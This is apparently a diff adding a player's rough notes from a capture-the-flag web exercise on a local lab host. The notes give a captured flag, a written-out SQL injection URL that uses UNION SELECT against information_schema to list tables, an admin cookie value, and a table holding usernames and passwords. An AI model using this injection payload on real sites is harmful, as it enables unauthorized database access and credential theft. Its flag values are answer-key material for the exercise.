@@ -1,0 +1,24 @@
+1. view-source:http://192.168.88.108/?page=recover line 48 
+	To get the flag change the email in hidden div
+	Flag: 1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0 
+
+
+2. MySQL injection
+   Page: ?page=member
+   Link: http://192.168.88.108/?page=member&id=1+AND+1%3D2+UNION+SELECT+table_name%2C+column_name+FROM+information_schema.columns&Submit=Submit#
+	This supposedly gives us all the names of tables existing in database.
+	Need to investigate further, probably can form a query to read each table.
+
+	also the (main?) table name might be 'Member_Sql_Injection'
+
+
+3. Weird cookie is attached to each request
+	Cookie
+	I_am_admin=68934a3e9455fa72420237eb05902327
+	Don't know what to do with it yet
+
+
+4. In step 2 MySQL query returned a suspicious table, column names:
+	db_default, id
+	db_default, username
+	db_default, password
